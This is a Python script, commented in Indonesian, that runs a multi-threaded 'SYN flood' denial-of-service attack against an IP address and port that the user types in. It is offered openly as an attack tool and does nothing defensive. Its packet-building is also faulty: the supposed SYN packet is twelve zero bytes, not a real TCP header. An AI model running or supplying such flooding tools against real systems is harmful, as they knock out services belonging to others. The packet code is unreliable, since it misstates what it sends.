import socket
import threading
import time
import os

# Untuk menggunakan warna di terminal
from colorama import init, Fore

# Inisialisasi colorama
init(autoreset=True)

# Fungsi untuk membersihkan layar terminal
def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

# Fungsi untuk melakukan SYN Flood
def syn_flood(target_ip, target_port, duration):
    # Membuat socket RAW untuk mengirim paket SYN
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

    # Header SYN TCP (minimal untuk contoh)
    syn_packet = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

    # Waktu akhir serangan
    end_time = time.time() + duration

    # Mengirimkan paket SYN dalam loop hingga waktu habis
    while time.time() < end_time:
        try:
            sock.sendto(syn_packet, (target_ip, target_port))
            print(Fore.GREEN + f"SENT SYN PACKET TO {target_ip}:{target_port}")
        except PermissionError:
            print(Fore.RED + "PERMISSION DENIED: JALANKAN SEBAGAI ROOT")
            break

# Fungsi utama
if __name__ == "__main__":
    clear_terminal()  # Membersihkan layar terminal
    print(Fore.YELLOW + "==== SYN FLOOD ATTACK ====")
    target_ip = input("MASUKKAN IP TARGET: ")  # Menginput IP target
    target_port = int(input("MASUKKAN PORT TARGET: "))  # Menginput port target
    num_threads = int(input("MASUKKAN JUMLAH THREAD: "))  # Menginput jumlah thread
    duration = int(input("MASUKKAN DURASI SERANGAN (DALAM DETIK): "))  # Menginput durasi serangan

    # Menjalankan serangan dalam beberapa thread
    for _ in range(num_threads):
        thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration))
        thread.start()
